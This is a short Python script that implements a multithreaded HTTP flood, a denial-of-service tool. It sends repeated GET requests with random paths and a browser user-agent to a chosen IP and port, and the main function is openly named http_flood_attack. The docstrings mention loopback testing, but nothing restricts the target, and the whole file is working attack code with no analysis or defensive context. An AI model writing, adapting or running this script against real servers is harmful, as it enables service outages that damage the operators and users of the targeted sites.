import threading
import socket
import random
import time

# Generate a random URL for the attack
def generate_random_url():
    paths = ["", "index.html", "about.html", "contact.html", "products.html"]
    random_path = random.choice(paths)
    return f"/{random_path}"

# HTTP request simulation
def http_request(target_ip, target_port, num_requests):
    """
    Simulates sending HTTP requests to a target.
    
    Args:
        target_ip (str): Target IP address (loopback for testing)
        target_port (int): Target port (default 80 for HTTP)
        num_requests (int): Number of HTTP requests to send
    """
    for _ in range(num_requests):
        # Create a random URL
        url = generate_random_url()

        # Construct an HTTP GET request
        request = f"GET {url} HTTP/1.1\r\n"
        request += f"Host: {target_ip}:{target_port}\r\n"
        request += "Connection: keep-alive\r\n"
        request += "User-Agent: Mozilla/5.0\r\n"
        request += "\r\n"

        # Send the request
        try:
            # Create socket connection to the target IP and port
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, target_port))
                s.sendall(request.encode())
        except Exception as e:
            print(f"Error sending HTTP request: {e}")

# Main function for launching the HTTP flood attack
def http_flood_attack(target_ip, target_port, num_threads, num_requests_per_thread):
    """
    Launches an HTTP flood attack using multiple threads to simulate clients.
    
    Args:
        target_ip (str): Target IP address (use 127.0.0.1 for testing)
        target_port (int): Target port number (80 for HTTP)
        num_threads (int): Number of threads (clients) to simulate
        num_requests_per_thread (int): Number of requests each thread will send
    """
    threads = []
    
    # Create and start threads
    for i in range(num_threads):
        thread = threading.Thread(target=http_request, args=(target_ip, target_port, num_requests_per_thread))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print(f"HTTP flood attack completed. {num_threads * num_requests_per_thread} requests sent.")
